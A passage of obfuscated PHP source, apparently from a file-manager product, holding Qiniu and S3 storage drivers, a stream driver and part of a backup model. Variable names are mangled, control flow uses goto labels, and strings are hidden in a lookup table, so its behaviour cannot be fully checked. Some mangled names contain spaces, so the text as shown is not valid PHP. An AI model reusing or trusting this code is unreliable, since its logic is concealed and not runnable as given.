$dùíµæ”†Ì[] = $e½Ú®êÎ£; if ($b®¦Æƒ‡) { $this->cacheMethod($b„ŞÓ±§¢[197], $e½Ú®êÎ£, !0); } } if ($AÜÌ’¼‡Ğ¬ === $b„ŞÓ±§¢[33]) { break; } } if ($b®¦Æƒ‡) { $this->cacheMethod($b„ŞÓ±§¢[197], $fà©áë®†ğ, !0); } goto aâ†’Î‰”é; DøªñÇò…±: $b„ŞÓ±§¢ =& $_SERVER[…ë˜õ]; $fà©áë®†ğ = trim($fà©áë®†ğ, $b„ŞÓ±§¢[8]); $C‚«†Œí ˜ = empty($fà©áë®†ğ) ? $b„ŞÓ±§¢[33] : $fà©áë®†ğ . $b„ŞÓ±§¢[8]; goto bŒ²«•ÛäÊ; bŒ²«•ÛäÊ: $AÜÌ’¼‡Ğ¬ = $b„ŞÓ±§¢[33]; $Aš§åöï³´ = 1000; $b®¦Æƒ‡ = $this->listItemCache === !1 ? !1 : !0; goto Aéª¶Š¼Ş…; AÎÇ‡˜’‚Ô: } public function canRead($Fò¡œÄºÒ) { return $this->exist($Fò¡œÄºÒ) ? !0 : !1; } public function canWrite($EÌÍ‚ÙÔ…’) { return $this->exist($EÌÍ‚ÙÔ…’) ? !0 : !1; } public function getContent($f¤×ëïóïÇ) { return $this->fileSubstr($f¤×ëïóïÇ, 0, -1); } public function setContent($b‰»¢É§Œ®, $CĞ§âèæé† = '') { $B©Ê‘…³Û = $this->tempFile($this->pathThis($b‰»¢É§Œ®)); file_put_contents($B©Ê‘…³Û, $CĞ§âèæé†); if ($this->upload($b‰»¢É§Œ®, $B©Ê‘…³Û)) { $this->tempFileRemve($B©Ê‘…³Û); return !0; } return !1; } public function refreshUrls($fñ¡°â˜ÇÅ) { goto b¹÷Ó‘‘„; b¹÷Ó‘‘„: $E×öõÕÓ·ê =& $_SERVER[…ë˜õ]; $dÃÊÒŒö™ = array(); if (is_array($fñ¡°â˜ÇÅ)) { foreach ($fñ¡°â˜ÇÅ as $Dô­ŠÔ—ÒÏ) { $dÃÊÒŒö™[] = $this->link($Dô­ŠÔ—ÒÏ); } } else { $dÃÊÒŒö™[] = $this->link($fñ¡°â˜ÇÅ); } goto c¤Úñ³òà‰; c’ÙÄ•è¶½: return $CãØ²Ş‹Ô[$E×öõÕÓ·ê[1083]] == $E×öõÕÓ·ê[738] ? !0 : !1; goto d²Œ³³ß¶; c¤Úñ³òà‰: $F¡¹¹ ¾É = new Qiniu\Cdn\CdnManager($this->auth); list($CãØ²Ş‹Ô, $eÆØô‚ÄÌà) = $F¡¹¹ ¾É->refreshUrls($dÃÊÒŒö™); if ($eÆØô‚ÄÌà) { return !1; } goto c’ÙÄ•è¶½; d²Œ³³ß¶: } public function fileSubstr($A™½•Éìâ², $bêè´¢ß•, $Eß¯•ÉØíå) { $E¡ºğª„ˆø =& $_SERVER[…ë˜õ]; if (!($cä«ğ¿è‚ = $this->link($A™½•Éìâ²))) { return !1; } $aÖ„¹“¥ê§ = !1; if ($Eß¯•ÉØíå > 0) { $AˆÖîöâÌ = $bêè´¢ß• + $Eß¯•ÉØíå - 1; $aÖ„¹“¥ê§ = array($E¡ºğª„ˆø[1313] . $bêè´¢ß• . $E¡ºğª„ˆø[434] . $AˆÖîöâÌ); } $F½›Ï¢ƒ²ª = url_request($cä«ğ¿è‚, $E¡ºğª„ˆø[226], !1, $aÖ„¹“¥ê§); return $F½›Ï¢ƒ²ª[$E¡ºğª„ˆø[731]] ? $F½›Ï¢ƒ²ª[$E¡ºğª„ˆø[1093]] : !1; } public function upload($e´¡Å…Ùâò, $Dö‚ŸÓ¢, $Bâğ¡…¸”— = false, $dİ¯¯Ì›İĞ = REPEAT_REPLACE) { $CŒ¶èÁ¨Œ– = new Qiniu\Storage\UploadManager(); $dèìÊ·¾™ = $this->auth->uploadToken($this->bucket, $e´¡Å…Ùâò); $B°˜Şî· = get_file_mime(get_path_ext($Dö‚ŸÓ¢)); list($aõÌâ§®é÷, $a¾³Ø³Œ‹) = $CŒ¶èÁ¨Œ–->putFile($dèìÊ·¾™, $e´¡Å…Ùâò, $Dö‚ŸÓ¢, null, $B°˜Şî·); return $a¾³Ø³Œ‹ ? !1 : $this->getPathOuter($e´¡Å…Ùâò); } public function uploadFormData($b·”™¢Â×, $DƒÚèÉè´× = 3600) { return $this->uploadToken($b·”™¢Â×, $DƒÚèÉè´×); } public function multiUploadFormData($c™È±´òß, $DËá›õ«”É = 3600) { return $this->uploadToken($c™È±´òß, $DËá›õ«”É); } private function uploadToken($a “ç›àÑ³, $F½†‘Ñù¿À = 3600) { goto eŒß…†Çóø; dí®ôÇ„á÷: $E²Ò¿†Ìµ˜ = $a “ç›àÑ³; $eÒæ´•Ú¢ö = $this->auth->uploadToken($this->bucket, $E²Ò¿†Ìµ˜, $CÍ®ŞÒÌÜ¼, $aÎ½ßèŠç“, !0); $FË…‡òØ’ô = empty($this->region) || $this->region == $eÖğ–¤™Ç[1316] ? $eÖğ–¤™Ç[33] : $eÖğ–¤™Ç[434] . $this->region; goto A†ÀĞÎ³·—; eŒß…†Çóø: $eÖğ–¤™Ç =& $_SERVER[…ë˜õ]; $CÍ®ŞÒÌÜ¼ = $F½†‘Ñù¿À; $aÎ½ßèŠç“ = array($eÖğ–¤™Ç[1314] => $eÖğ–¤™Ç[1315]); goto dí®ôÇ„á÷; A†ÀĞÎ³·—: $eƒ’‘å‹ô× = http_type() . "\72\x2f\x2f\165\160\154\157\x61\144{$FË…‡òØ’ô}\x2e\161\x69\156\151\x75\x70\x2e\x63\157\x6d\57"; return array($eÖğ–¤™Ç[1317] => $eÒæ´•Ú¢ö, $eÖğ–¤™Ç[1318] => $eƒ’‘å‹ô×); goto DœÉÀ´©ïğ; DœÉÀ´©ïğ: } public function download($cÏĞ…»§“, $c³‚õÒ£àï) { goto c¥¾é®ãÌ; bßõ¾’²ä: $eçµÉñ ­¥ = 1024 * 200; $F¶Ú¥™‘Û‡ = fopen($E±Ü°é®­ö, $_SERVER[…ë˜õ][1319]); while (!0) { $c‚¼Áøóºˆ = $this->fileSubstr($cÏĞ…»§“, $d“”øù¹, $eçµÉñ ­¥); if ($c‚¼Áøóºˆ === !1) { return !1; } fwrite($F¶Ú¥™‘Û‡, $c‚¼Áøóºˆ); $d“”øù¹ += $eçµÉñ ­¥; if (strlen($c‚¼Áøóºˆ) < $eçµÉñ ­¥) { break; } } goto a«Ë¹øç; c¥¾é®ãÌ: $E±Ü°é®­ö = IO::getPathInner(IO::mkfile($c³‚õÒ£àï)); if (!($a¾¿ë„ß‡¯ = $this->link($cÏĞ…»§“))) { return !1; } $d“”øù¹ = 0; goto bßõ¾’²ä; a«Ë¹øç: fclose($F¶Ú¥™‘Û‡); return $c³‚õÒ£àï; goto FªâÇŒ†ùä; FªâÇŒ†ùä: } public function link($EçòÑ½·Ùâ, $d¿ÂùäÙÏ = '') { if (!$this->isFile($EçòÑ½·Ùâ)) { return !1; } $d¥ğé«†Ô¬ = $this->getHost() . $_SERVER[…ë˜õ][8] . $this->pathEncode($EçòÑ½·Ùâ) . $d¿ÂùäÙÏ; return $this->auth->privateDownloadUrl($d¥ğé«†Ô¬, 3600 * 12); } public function fileOut($BŠ æŸ¾ùˆ, $côŒÃÍ¿çŒ = false, $F‚äÎß¶‚ß = false, $EÏ†¸ã£Ô“ = '') { $BÜ¨ÊÓã¹ğ =& $_SERVER[…ë˜õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($BŠ æŸ¾ùˆ, $côŒÃÍ¿çŒ, $F‚äÎß¶‚ß, $EÏ†¸ã£Ô“); } if (!$F‚äÎß¶‚ß) { $F‚äÎß¶‚ß = $this->pathThis($BŠ æŸ¾ùˆ); } $f¢ËêÛ¯ £ = $côŒÃÍ¿çŒ ? $BÜ¨ÊÓã¹ğ[1320] . rawurlencode($F‚äÎß¶‚ß) : $BÜ¨ÊÓã¹ğ[33]; $Eâô¢Ê¶ï = $this->link($BŠ æŸ¾ùˆ, $f¢ËêÛ¯ £); $this->fileOutLink($Eâô¢Ê¶ï); } public function fileOutServer($e³­…ø´ÙÄ, $FÎíøÔË‘ƒ = false, $DÎïÅéô¾™ = false, $cÀÇµšâªå = '') { parent::fileOut($e³­…ø´ÙÄ, $FÎíøÔË‘ƒ, $DÎïÅéô¾™, $cÀÇµšâªå); } public function fileOutImage($a˜˜•³‡‡, $fè¦ˆ»Üƒ² = 250) { $Eä…‰•Å¶³ = $this->link($a˜˜•³‡‡, $_SERVER[…ë˜õ][1321] . $fè¦ˆ»Üƒ²); $this->fileOutLink($Eä…‰•Å¶³); } public function fileOutImageServer($CâÓŒáÚ¼ğ, $cíí·®®ù = 250) { parent::fileOutImage($CâÓŒáÚ¼ğ, $cíí·®®ù); } public function hashMd5($bÕÎ ¼ó’…) { $föÌ—ÂĞÔÉ =& $_SERVER[…ë˜õ]; $B³Ê‹Ôİ¤Ó = $this->objectMeta($bÕÎ ¼ó’…); return isset($B³Ê‹Ôİ¤Ó[$föÌ—ÂĞÔÉ[206]]) ? $B³Ê‹Ôİ¤Ó[$föÌ—ÂĞÔÉ[206]] : !1; $e„˜ÊïŠğ = $this->link($bÕÎ ¼ó’…, $föÌ—ÂĞÔÉ[1322]); } public function size($d§®¯¶óÁì) { $bÇğ‹ÓïÈÌ = $this->objectMeta($d§®¯¶óÁì); return $bÇğ‹ÓïÈÌ ? $bÇğ‹ÓïÈÌ[$_SERVER[…ë˜õ][77]] : 0; } public function info($c‡Ñ‘¥¶Œµ) { if ($this->isFolder($c‡Ñ‘¥¶Œµ)) { return $this->folderInfo($c‡Ñ‘¥¶Œµ); } else { if ($this->isFile($c‡Ñ‘¥¶Œµ)) { return $this->fileInfo($c‡Ñ‘¥¶Œµ); } } return !1; } public function exist($dÑø°±†óì) { return $this->isFile($dÑø°±†óì) || $this->isFolder($dÑø°±†óì); } public function isFile($Bõêï‘Åªë) { return !$this->isFolder($Bõêï‘Åªë) && $this->objectMeta($Bõêï‘Åªë); } public function isFolder($Cï¡êÈØåÒ) { return $this->cacheMethod($_SERVER[…ë˜õ][197], $Cï¡êÈØåÒ); } protected function objectMeta($CÆÍÍëŞ) { return $this->cacheMethod($_SERVER[…ë˜õ][198], $CÆÍÍëŞ); } protected function _objectMeta($eºé¢¢‘µ‘) { $f±äòÖì”Â =& $_SERVER[…ë˜õ]; list($eã³ïö×©, $d„‡Á¨¹¼£) = $this->bucketManager->stat($this->bucket, $eºé¢¢‘µ‘); if ($eã³ïö×©) { $eã³ïö×©[$f±äòÖì”Â[77]] = intval($eã³ïö×©[$f±äòÖì”Â[1308]]); } return $eã³ïö×©; } protected function _isFolder($fÌÄ §«ğØ) { $fèƒ“ôÃôó =& $_SERVER[…ë˜õ]; if ($fÌÄ §«ğØ == $fèƒ“ôÃôó[33] || $fÌÄ §«ğØ == $fèƒ“ôÃôó[8]) { return !0; } list($CÖ±ë¹ÅŒÈ, $f•‘¿ãÔÂ) = $this->bucketManager->listFiles($this->bucket, trim($fÌÄ §«ğØ, $fèƒ“ôÃôó[8]) . $fèƒ“ôÃôó[8], $fèƒ“ôÃôó[33], 1, $fèƒ“ôÃôó[8]); return !empty($CÖ±ë¹ÅŒÈ[$fèƒ“ôÃôó[1311]]) || !empty($CÖ±ë¹ÅŒÈ[$fèƒ“ôÃôó[1312]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($aÁ„å…À–) { parent::__construct($aÁ„å…À–); } public function uploadFormData($C‹ÄœÓ•İ©, $añö´à† = 3600) { goto dÈŠšˆ„š‰; EêÎä¿ÕËæ: $cÔ×Ã„„¼ = hash_hmac($E×†ø£¦[1238], $B•´˜çË±, $A¾é¢‡¥ñÍ, !0); $a÷Œê™¿« = hash_hmac($E×†ø£¦[1238], $eöšˆ´«‰ë, $cÔ×Ã„„¼, !0); $E‹³‹Ø©ï¨ = hash_hmac($E×†ø£¦[1238], $aåùè¯Ş²­, $a÷Œê™¿«); goto aÖÕ×Ä­õ; Aàæğµ®­: $B•´˜çË± = $E×†ø£¦[59]; $bà’ğÉ¢İ¬ = gmdate($E×†ø£¦[1229]); $dŒ¿™Œœæ = gmdate($E×†ø£¦[732]); goto C¿ï——òíè; aÖÕ×Ä­õ: $DÛëÑÁ¶³Š = array($E×†ø£¦[209] => $E×†ø£¦[33], $E×†ø£¦[1240] => $E×†ø£¦[33], $E×†ø£¦[1196] => $cÆÂå¿Ü­, $E×†ø£¦[1200] => $C½¬ìÜöô, $E×†ø£¦[1204] => $aåùè¯Ş²­, $E×†ø£¦[1241] => $Dˆ‚Ê£ÈñÏ, $E×†ø£¦[1242] => $FâöñÅÜê, $E×†ø£¦[1243] => $bà’ğÉ¢İ¬, $E×†ø£¦[1244] => $Cî¨Èâš÷Á, $E×†ø£¦[1245] => $E‹³‹Ø©ï¨, $E×†ø£¦[174] => $this->getHost()); return $DÛëÑÁ¶³Š; goto DŒÍ¿óÁ‹’; C¿ï——òíè: $eöšˆ´«‰ë = $E×†ø£¦[1230]; $Cî¨Èâš÷Á = $añö´à† . $E×†ø£¦[33]; $C½¬ìÜöô = $E×†ø£¦[1192]; goto BæÂÖò÷‰Œ; dÈŠšˆ„š‰: $E×†ø£¦ =& $_SERVER[…ë˜õ]; $cÆÂå¿Ü­ = $E×†ø£¦[190]; $FâöñÅÜê = $E×†ø£¦[1228]; goto Aàæğµ®­; BæÂÖò÷‰Œ: $C¼‡³§ ” = array($this->accessKey, $dŒ¿™Œœæ, $this->region, $B•´˜çË±, $eöšˆ´«‰ë); $Dˆ‚Ê£ÈñÏ = implode($E×†ø£¦[8], $C¼‡³§ ”); $dÑô‡Ç¤ø« = array($E×†ø£¦[1194] => gmdate($E×†ø£¦[1193], strtotime($E×†ø£¦[1231])), $E×†ø£¦[1195] => array(array($E×†ø£¦[1197] => $this->bucket), array($E×†ø£¦[1196] => $cÆÂå¿Ü­), array($E×†ø£¦[1198], $E×†ø£¦[1199], $E×†ø£¦[33]), array($E×†ø£¦[1198], $E×†ø£¦[1232], $E×†ø£¦[33]), array($E×†ø£¦[1198], $E×†ø£¦[1233], $E×†ø£¦[33]), array($E×†ø£¦[1200] => $C½¬ìÜöô), array($E×†ø£¦[1234] => $Dˆ‚Ê£ÈñÏ), array($E×†ø£¦[1235] => $FâöñÅÜê), array($E×†ø£¦[1236] => $bà’ğÉ¢İ¬), array($E×†ø£¦[1237] => $Cî¨Èâš÷Á))); goto cÕ ‰ƒ„Ã·; cÕ ‰ƒ„Ã·: $aåùè¯Ş²­ = base64_encode(json_encode($dÑô‡Ç¤ø«)); $Eé¬±¤«” = hash_hmac($E×†ø£¦[1238], $dŒ¿™Œœæ, $E×†ø£¦[1239] . $this->secret, !0); $A¾é¢‡¥ñÍ = hash_hmac($E×†ø£¦[1238], $this->region, $Eé¬±¤«”, !0); goto EêÎä¿ÕËæ; DŒÍ¿óÁ‹’: } public function multiUploadFormData($B·ÁãŠÛœó, $AİñíÔŠ¾ = 3600) { $aÜŠƒ­ˆÚÍ =& $_SERVER[…ë˜õ]; $B†ÔÓ—ßˆ± = gmdate($aÜŠƒ­ˆÚÍ[1323]); $E®Øã¦Îİ³ = array(); $bÎ¤Í¼áÇ = $this->client->getUploadId($this->bucket, $B·ÁãŠÛœó, $E®Øã¦Îİ³); if (!$bÎ¤Í¼áÇ) { return !1; } return array($aÜŠƒ­ˆÚÍ[219] => $bÎ¤Í¼áÇ, $aÜŠƒ­ˆÚÍ[174] => $this->getHost() . $aÜŠƒ­ˆÚÍ[8] . $this->pathEncode($B·ÁãŠÛœó), $aÜŠƒ­ˆÚÍ[220] => $B†ÔÓ—ßˆ±, $aÜŠƒ­ˆÚÍ[92] => $B·ÁãŠÛœó); } public function multiUploadAuthData($e•òÀêÌ, $d‚¹ê³™§ = array()) { goto BÔ†¸‡†Øé; b‰Åó˜…¦ä: if (isset($d‚¹ê³™§[$cÂñª¦¬…Ø[1324]])) { $a›Ğäö­¸ì[$cÂñª¦¬…Ø[1325]] = $d‚¹ê³™§[$cÂñª¦¬…Ø[1324]]; } $bŠöåÑ•Ä = explode($cÂñª¦¬…Ø[176], $this->getHost()); $c·´ÚäŒĞÁ = array($cÂñª¦¬…Ø[1326] => $bŠöåÑ•Ä[1], $cÂñª¦¬…Ø[1327] => $cÂñª¦¬…Ø[33], $cÂñª¦¬…Ø[209] => $cÂñª¦¬…Ø[118], $cÂñª¦¬…Ø[1240] => $d‚¹ê³™§[$cÂñª¦¬…Ø[77]]); goto C‰°ÅÈÓˆ; f‘»™©…ç: unset($d‚¹ê³™§[$cÂñª¦¬…Ø[92]]); if (isset($d‚¹ê³™§[$cÂñª¦¬…Ø[221]])) { return $this->listUploadParts($d¼é¥³óŠ“, $d‚¹ê³™§); } $a›Ğäö­¸ì = array(); goto b‰Åó˜…¦ä; BÔ†¸‡†Øé: $cÂñª¦¬…Ø =& $_SERVER[…ë˜õ]; $Bî˜Û–äğŒ = isset($d‚¹ê³™§[$cÂñª¦¬…Ø[167]]) ? $d‚¹ê³™§[$cÂñª¦¬…Ø[167]] : $cÂñª¦¬…Ø[33]; $d¼é¥³óŠ“ = $d‚¹ê³™§[$cÂñª¦¬…Ø[92]]; goto f‘»™©…ç; C‰°ÅÈÓˆ: $eÛ…Ü÷âÙñ = $cÂñª¦¬…Ø[224]; $f“µ›ø¿äè = $cÂñª¦¬…Ø[8] . $this->pathEncode($d¼é¥³óŠ“) . $Bî˜Û–äğŒ; $fáì‰ëÙò‹ = $this->client->__getSignatureV4($a›Ğäö­¸ì, $c·´ÚäŒĞÁ, $eÛ…Ü÷âÙñ, $f“µ›ø¿äè); goto dæ³ÎÍ¥; dæ³ÎÍ¥: if (strpos($Bî˜Û–äğŒ, $cÂñª¦¬…Ø[223]) === 0) { if (isset($a›Ğäö­¸ì[$cÂñª¦¬…Ø[1325]])) { $Eã’ÖÊ¹‡É = $a›Ğäö­¸ì[$cÂñª¦¬…Ø[1325]]; } else { if (isset($fáì‰ëÙò‹[$cÂñª¦¬…Ø[1325]])) { $Eã’ÖÊ¹‡É = $fáì‰ëÙò‹[$cÂñª¦¬…Ø[1325]]; } else { $Eã’ÖÊ¹‡É = hash($cÂñª¦¬…Ø[1238], $cÂñª¦¬…Ø[33]); } } return array($cÂñª¦¬…Ø[230] => $fáì‰ëÙò‹[$cÂñª¦¬…Ø[230]], $cÂñª¦¬…Ø[1325] => $Eã’ÖÊ¹‡É, $cÂñª¦¬…Ø[220] => $fáì‰ëÙò‹[$cÂñª¦¬…Ø[1328]]); } return $fáì‰ëÙò‹[$cÂñª¦¬…Ø[230]]; goto cç†¬¸‚¥ã; cç†¬¸‚¥ã: } public function listUploadParts($bñ«Æµ‚£ç, $d‘©Ç×ÍÊÑ = array()) { goto eÍ£·™êÔÉ; B†²Íª›Ã: $aÀ„Öğ—”Ö .= $BÔßš¹¦ŠÏ[1332]; $E“Á³‡à‚´ = array(); $FĞôö‚Ú® = explode($BÔßš¹¦ŠÏ[176], $this->getHost()); goto cÎÎÆ»ŠÓÚ; eÍ£·™êÔÉ: $BÔßš¹¦ŠÏ =& $_SERVER[…ë˜õ]; $F·ñÛ¿œ = str_replace($BÔßš¹¦ŠÏ[231], $BÔßš¹¦ŠÏ[33], $d‘©Ç×ÍÊÑ[$BÔßš¹¦ŠÏ[167]]); $DŠëÇÉ¹Å = $this->client->listParts($this->bucket, $bñ«Æµ‚£ç, $F·ñÛ¿œ); goto CŒ®îÃÂï; CŒ®îÃÂï: if (!$DŠëÇÉ¹Å) { return !1; } $aÀ„Öğ—”Ö = $BÔßš¹¦ŠÏ[1329]; foreach ($DŠëÇÉ¹Å as $CŠ‡ËË‹İ) { $aÀ„Öğ—”Ö .= $BÔßš¹¦ŠÏ[1330] . "\74\120\141\x72\164\x4e\x75\155\142\145\162\x3e{$CŠ‡ËË‹İ[$BÔßš¹¦ŠÏ[1285]]}\x3c\57\120\x61\162\164\116\x75\155\142\145\162\x3e\xa" . "\x3c\x45\x54\141\147\76{$CŠ‡ËË‹İ[$BÔßš¹¦ŠÏ[1286]]}\74\x2f\105\124\x61\x67\76\xa" . $BÔßš¹¦ŠÏ[1331]; } goto B†²Íª›Ã; d†ÀÚÆ¨ÂŠ: $F©‹µÆ˜Ÿ› = $this->client->__getSignatureV4($E“Á³‡à‚´, $dßØîÃ“ß‰, $cËğ¥ÀöÁ­, $fÕ…°ğÌ÷­, $aÀ„Öğ—”Ö); return array($BÔßš¹¦ŠÏ[230] => $F©‹µÆ˜Ÿ›[$BÔßš¹¦ŠÏ[230]], $BÔßš¹¦ŠÏ[220] => $F©‹µÆ˜Ÿ›[$BÔßš¹¦ŠÏ[1328]], $BÔßš¹¦ŠÏ[232] => $DŠëÇÉ¹Å, $BÔßš¹¦ŠÏ[1325] => $F©‹µÆ˜Ÿ›[$BÔßš¹¦ŠÏ[1325]]); goto EÓò§º½¸ƒ; cÎÎÆ»ŠÓÚ: $dßØîÃ“ß‰ = array($BÔßš¹¦ŠÏ[1326] => $FĞôö‚Ú®[1], $BÔßš¹¦ŠÏ[209] => $BÔßš¹¦ŠÏ[118], $BÔßš¹¦ŠÏ[1240] => strlen($aÀ„Öğ—”Ö)); $cËğ¥ÀöÁ­ = $BÔßš¹¦ŠÏ[222]; $fÕ…°ğÌ÷­ = $BÔßš¹¦ŠÏ[8] . $this->pathEncode($bñ«Æµ‚£ç) . $d‘©Ç×ÍÊÑ[$BÔßš¹¦ŠÏ[167]]; goto d†ÀÚÆ¨ÂŠ; EÓò§º½¸ƒ: } public function link($Dœ»Õôßø, $dˆ£ßÌš¦ï = array()) { return parent::link($Dœ»Õôßø, $dˆ£ßÌš¦ï); } public function fileOut($DíƒÖÔŠòİ, $D˜£»ß‹ÈË = false, $fåÜ ³µ× = false, $fô´†Ì± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[…ë˜õ][1333])) { return parent::fileOutServer($DíƒÖÔŠòİ, $D˜£»ß‹ÈË, $fåÜ ³µ×, $fô´†Ì±); } parent::fileOut($DíƒÖÔŠòİ, $D˜£»ß‹ÈË, $fåÜ ³µ×, $fô´†Ì±); } public function fileOutImage($F°Õê‹’å†, $cë®Ò—£¹‡ = 250) { if (strstr($this->endpoint, $_SERVER[…ë˜õ][1333])) { return parent::fileOutImageServer($F°Õê‹’å†, $cë®Ò—£¹‡); } parent::fileOutImage($F°Õê‹’å†, $cë®Ò—£¹‡); } public function fileOutLink($f·“·“·‚ù) { $a’ŠƒÜß”è =& $_SERVER[…ë˜õ]; if (substr($f·“·“·‚ù, 0, 7) == $a’ŠƒÜß”è[1207]) { $f·“·“·‚ù = $a’ŠƒÜß”è[1208] . substr($f·“·“·‚ù, 7); } header($a’ŠƒÜß”è[158] . $f·“·“·‚ù); die; } public function getHost() { $a’¤ê’Ò¨Å =& $_SERVER[…ë˜õ]; $f™³Ë„ÔÀÇ = str_rtrim(parent::getHost(), $a’¤ê’Ò¨Å[8] . $this->bucket); $f™³Ë„ÔÀÇ = explode($a’¤ê’Ò¨Å[176], $f™³Ë„ÔÀÇ); return $f™³Ë„ÔÀÇ[0] . $a’¤ê’Ò¨Å[176] . $this->bucket . $a’¤ê’Ò¨Å[94] . $f™³Ë„ÔÀÇ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($B÷Œ²Ã¶†, $aïä»™õ… = 0) { parent::__construct(); $this->source = $B÷Œ²Ã¶†; $this->sourceSize = $aïä»™õ…; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($aËğ„±•¦ = false) { return $this->sourceSize; } public function getContent($A·‹“ÑÅÊñ = false) { return $this->fileSubstr($A·‹“ÑÅÊñ, 0, $this->sourceSize); } public function fileSubstr($B‰ë³Ìì×· = false, $F¢›£ÖˆÓ· = 0, $b÷è¿ïã£ƒ = 0) { if (!$b÷è¿ïã£ƒ) { $b÷è¿ïã£ƒ = $this->sourceSize; } $b¿‡ÃãÌ = $this->sourceSize - $F¢›£ÖˆÓ·; if ($b÷è¿ïã£ƒ >= $b¿‡ÃãÌ) { $b÷è¿ïã£ƒ = $b¿‡ÃãÌ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F¢›£ÖˆÓ·, $b÷è¿ïã£ƒ); } if ($this->sourceType == self::TYPE_FILE) { if ($b÷è¿ïã£ƒ <= 0) { return $_SERVER[…ë˜õ][33]; } $eÂéçâß™ = ftell($this->source); fseek_64($this->source, $eÂéçâß™ + $F¢›£ÖˆÓ·); $f•»‰ °ĞÖ = @fread($this->source, $b÷è¿ïã£ƒ); fseek_64($this->source, $eÂéçâß™); return $f•»‰ °ĞÖ; } } public function hashMd5($c’ß—‹İ¨ = false) { return md5($this->getContent()); } public static function hash($F¹Øç”ÛË†, $FØ®¨ÍĞğó = 0) { $E¯ïêªïæ = new PathDriverStream($F¹Øç”ÛË†, $FØ®¨ÍĞğó); return $E¯ïêªïæ->hashSimple($F¹Øç”ÛË†); } public static function md5($DøÇäö±à, $F»µó£·™Ç = 0) { $aºŞ·‡³î = new PathDriverStream($DøÇäö±à, $F»µó£·™Ç); return $aºŞ·‡³î->hashMd5($DøÇäö±à); } } goto DæÑù¯Ó³‰; B´Ï‚÷â³î: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\142\x61\143\153\165\x70\x4c\151\163\164"; public $field = array("\x69\157", "\x6e\141\155\x65", "\x73\x74\x61\164\165\163", "\143\157\156\164\145\156\x74", "\162\145\x73\165\x6c\x74", "\x74\151\x6d\145\x46\162\157\x6d", "\164\x69\155\145\x54\x6f"); public function config() { goto Eç“’‰¯ª; f×›âøö¦¸: if (isset($Aªù°•„ß¥[$FÅéñíÎ…[195]])) { $Aªù°•„ß¥[$FÅéñíÎ…[195]] = json_decode($Aªù°•„ß¥[$FÅéñíÎ…[195]], !0); } if (isset($BÌ°ºÈ® ï[$FÅéñíÎ…[195]])) { $Aªù°•„ß¥[$FÅéñíÎ…[195]][$FÅéñíÎ…[1504]] = $BÌ°ºÈ® ï[$FÅéñíÎ…[195]]; unset($BÌ°ºÈ® ï[$FÅéñíÎ…[195]]); } return array_merge($Aªù°•„ß¥, $BÌ°ºÈ® ï); goto B®êëßˆ„”; f£ğ…•ùğÇ: Action($FÅéñíÎ…[1718])->taskInit(); $d…»”ïË‘ä = Model($FÅéñíÎ…[1719])->listData(); foreach ($d…»”ïË‘ä as $f¬Ñ±¡®‘) { if ($f¬Ñ±¡®‘[$FÅéñíÎ…[1174]] == $FÅéñíÎ…[86] && $f¬Ñ±¡®‘[$FÅéñíÎ…[1519]] == $FÅéñíÎ…[1720]) { $Aªù°•„ß¥ = $f¬Ñ±¡®‘; break; } } goto f×›âøö¦¸; CÅÒ²îïÙë: $BÌ°ºÈ® ï = is_array($BÌ°ºÈ® ï) ? $BÌ°ºÈ® ï : array(); if (!isset($BÌ°ºÈ® ï[$FÅéñíÎ…[734]])) { $BÌ°ºÈ® ï[$FÅéñíÎ…[734]] = $FÅéñíÎ…[86]; } $Aªù°•„ß¥ = array(); goto f£ğ…•ùğÇ; Eç“’‰¯ª: $FÅéñíÎ… =& $_SERVER[…ë˜õ]; $BÌ°ºÈ® ï = Model($FÅéñíÎ…[1129])->get($FÅéñíÎ…[755]); $BÌ°ºÈ® ï = json_decode($BÌ°ºÈ® ï, !0); goto CÅÒ²îïÙë; B®êëßˆ„”: } public function listData($Dñ¿¤ã‰ö = false, $c•‰„²æë‹ = "\x6d\157\144\x69\146\171\124\151\155\145", $f ‡³çøƒ = false) { return parent::listData($Dñ¿¤ã‰ö, $c•‰„²æë‹, !0); } public function lastItem() { $a¼ÒçÊ‹Š… = $this->listData(); return !empty($a¼ÒçÊ‹Š…[0]) ? $a¼ÒçÊ‹Š…[0] : null; } public function kill($D§§Ÿš×) { goto A¤ãÓ«ºÏ—; fÃ¹¥—ê¥æ: return $this->remove($D§§Ÿš×); goto D²è¾ùóí´; bã¬¨Ü¢¦³: $E—ÅÔÑ¯ÑÌ = $D½çšÀÅŒÄ[$BœÃ¾Ùš‡Ä[28]]; $DÕ¢¹¢Œ‘ğ = TEMP_FILES . $BœÃ¾Ùš‡Ä[751] . $E—ÅÔÑ¯ÑÌ . $BœÃ¾Ùš‡Ä[8]; IO::remove($DÕ¢¹¢Œ‘ğ, !1); goto fÃ¹¥—ê¥æ; A¤ãÓ«ºÏ—: $BœÃ¾Ùš‡Ä =& $_SERVER[…ë˜õ]; $D½çšÀÅŒÄ = $this->listData($D§§Ÿš×); if (!$D½çšÀÅŒÄ || empty($D½çšÀÅŒÄ[$BœÃ¾Ùš‡Ä[28]])) { return !0; } goto Eåß«Á·è; Eåß«Á·è: Task::kill($BœÃ¾Ùš‡Ä[754]); Task::kill($BœÃ¾Ùš‡Ä[773]); Task::kill($BœÃ¾Ùš‡Ä[782]); goto bã¬¨Ü¢¦³; D²è¾ùóí´: } public function remove($eÒ°ë±Û´Í) { $Aøº‘ø»äê = $this->listData($eÒ°ë±Û´Í); if (!$Aøº‘ø»äê) { return !0; } return $this->backupRemove($Aøº‘ø»äê); } private function backupRemove($eä„Ãšç±“) { $C¢ìé÷ª‚ =& $_SERVER[…ë˜õ]; parent::remove($eä„Ãšç±“[$C¢ìé÷ª‚[388]]); $c¾Ğƒ¾’’Ø = "\x7b\151\x6f\x3a{$eä„Ãšç±“[$C¢ìé÷ª‚[733]]}\x7d\x2f\144\141\164\141\x62\141\x73\x65\x2f\142\x61\x63\x6b\x75\160\x5f" . $eä„Ãšç±“[$C¢ìé÷ª‚[28]]; IO::remove($c¾Ğƒ¾’’Ø, !1); return !0; } public function start() { goto 